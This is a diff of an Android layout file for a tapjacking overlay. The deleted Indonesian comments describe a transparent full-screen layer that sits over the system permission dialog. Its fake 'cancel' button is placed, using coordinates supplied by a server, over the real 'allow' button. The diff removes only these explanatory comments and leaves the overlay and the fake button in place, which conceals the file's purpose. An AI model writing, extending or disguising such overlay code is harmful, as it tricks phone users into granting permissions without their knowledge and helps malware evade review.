@@ -1,12 +1,4 @@
 <?xml version="1.0" encoding="utf-8"?>
-<!--
-    overlay_trick.xml
-    Layout transparan penuh layar yang menimpa dialog izin sistem.
-    Diinflate oleh OverlayTrickManager saat auto-trigger aktif.
-
-    Posisi tombol "BATAL" (palsu) dikontrol lewat LayoutParams di runtime
-    agar bisa disesuaikan ke koordinat tombol "IZINKAN" milik ROM spesifik.
--->
 <FrameLayout
     xmlns:android="http://schemas.android.com/apk/res/android"
     android:id="@+id/overlayTrickRoot"
@@ -16,13 +8,6 @@
     android:clickable="true"
     android:focusable="false">
 
-    <!--
-        Tombol palsu — terlihat user sebagai "BATAL".
-        Posisi (gravity + margin) di-override oleh OverlayTrickManager
-        berdasarkan config JSON targetX/targetY dari server.
-        Default: Gravity.BOTTOM | CENTER_HORIZONTAL, bottomMargin 180dp
-        (sejajar tombol "IZINKAN" AOSP default).
-    -->
     <TextView
         android:id="@+id/fakeCancelBtn"
         android:layout_width="wrap_content"
